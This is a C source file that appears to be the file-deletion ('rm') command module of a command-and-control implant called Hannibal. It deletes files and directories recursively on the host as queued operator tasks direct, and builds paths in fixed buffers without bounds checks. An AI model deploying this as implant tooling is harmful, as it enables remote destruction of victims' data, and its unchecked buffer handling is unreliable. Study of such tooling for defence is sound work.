#include "config.h"


#ifdef INCLUDE_CMD_RM

#include "hannibal_tasking.h"

SECTION_CODE void delete_directory(LPCWSTR path) 
{
    HANNIBAL_INSTANCE_PTR

    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    WCHAR searchPath[MAX_PATH];
    for (int i = 0; path[i] != L'\0'; i++) {
        searchPath[i] = path[i];
    }
    searchPath[pic_strlenW(path)] = L'\\'; 
    searchPath[pic_strlenW(path) + 1] = L'*';
    searchPath[pic_strlenW(path) + 2] = L'\0';

    hFind = hannibal_instance_ptr->Win32.FindFirstFileW(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.cFileName[0] != L'.' || 
                (findData.cFileName[1] != L'\0' && findData.cFileName[1] != L'.')) {
                WCHAR fullPath[MAX_PATH];
                
                int len = 0;
                for (int i = 0; path[i] != L'\0'; i++) {
                    fullPath[len++] = path[i];
                }
                fullPath[len++] = L'\\';
                for (int i = 0; findData.cFileName[i] != L'\0'; i++) {
                    fullPath[len++] = findData.cFileName[i];
                }
                fullPath[len] = L'\0'; 

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    delete_directory(fullPath);
                    hannibal_instance_ptr->Win32.RemoveDirectoryW(fullPath);
                } else {
                    hannibal_instance_ptr->Win32.DeleteFileW(fullPath);
                }
            }
        } while (hannibal_instance_ptr->Win32.FindNextFileW(hFind, &findData) != 0);
        hannibal_instance_ptr->Win32.FindClose(hFind);
    }
}

SECTION_CODE void delete_files_by_pattern(LPCWSTR directory, LPCWSTR pattern) 
{
    HANNIBAL_INSTANCE_PTR

    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    WCHAR searchPath[MAX_PATH];
    int len = 0;
    
    while (directory[len] != L'\0') {
        searchPath[len] = directory[len];
        len++;
    }

    searchPath[len++] = L'\\'; 
    while (*pattern != L'\0') {
        searchPath[len++] = *pattern++;
    }
    searchPath[len] = L'\0';
    
    hFind = hannibal_instance_ptr->Win32.FindFirstFileW(searchPath, &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.cFileName[0] != L'.' || 
                (findData.cFileName[1] != L'\0' && findData.cFileName[1] != L'.')) {
                WCHAR fullPath[MAX_PATH];
                
                int pathLen = 0;
                while (directory[pathLen] != L'\0') {
                    fullPath[pathLen] = directory[pathLen];
                    pathLen++;
                }
                fullPath[pathLen++] = L'\\';
                
                int fileNameLen = 0;
                while (findData.cFileName[fileNameLen] != L'\0') {
                    fullPath[pathLen++] = findData.cFileName[fileNameLen++];
                }
                fullPath[pathLen] = L'\0'; 

                hannibal_instance_ptr->Win32.DeleteFileW(fullPath);
            }
        } while (hannibal_instance_ptr->Win32.FindNextFileW(hFind, &findData) != 0);
        hannibal_instance_ptr->Win32.FindClose(hFind);
    }

}


SECTION_CODE int contains_wildcard(LPCWSTR path) 
{
    while (*path != L'\0') {
        if (*path == L'*' || *path == L'?') {
            return 1; // Wildcard found
        }
        path++;
    }
    return 0; // No wildcards
}

/**
 * Be careful using this as it automatically recursively deletes directories.
 */
SECTION_CODE void cmd_rm(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_RM *rm = (CMD_RM *)t.cmd;

    LPCWSTR path = rm->path;

    
    if (contains_wildcard(path)) {
        WCHAR directory[MAX_PATH];
        WCHAR pattern[MAX_PATH];

        int i = 0;
        while (path[i] != L'\0' && path[i] != L'*' && path[i] != L'?') {
            directory[i] = path[i];
            i++;
        }
        directory[i] = L'\0';

        int j = 0;
        while (path[i] != L'\0') {
            pattern[j++] = path[i++];
        }
        pattern[j] = L'\0';

        delete_files_by_pattern(directory, pattern);
    } else {
        DWORD fileAttr = hannibal_instance_ptr->Win32.GetFileAttributesW(path);
        if (fileAttr == INVALID_FILE_ATTRIBUTES) {
            TASK response_t;
            LPCWSTR response_content = L"Path Does Not Exist";
            response_t.output = (LPCSTR)response_content;
            response_t.output_size = pic_strlenW(response_content)*sizeof(WCHAR) + 2;
            response_t.task_uuid = t.task_uuid;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

            hannibal_instance_ptr->Win32.VirtualFree(rm->path, 0, MEM_RELEASE);
            hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);

            return; 
        }
        if (fileAttr & FILE_ATTRIBUTE_DIRECTORY) {
            delete_directory(path);
            hannibal_instance_ptr->Win32.RemoveDirectoryW(path); 
        } else {
           hannibal_instance_ptr->Win32.DeleteFileW(path);
        }
    }

    TASK response_t;

    LPCWSTR response_content = L"Command Issued";

    response_t.output = (LPCSTR)response_content;
    response_t.output_size = pic_strlenW(response_content)*sizeof(WCHAR) + 2;
    response_t.task_uuid = t.task_uuid;

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.VirtualFree(rm->path, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
    
}

#endif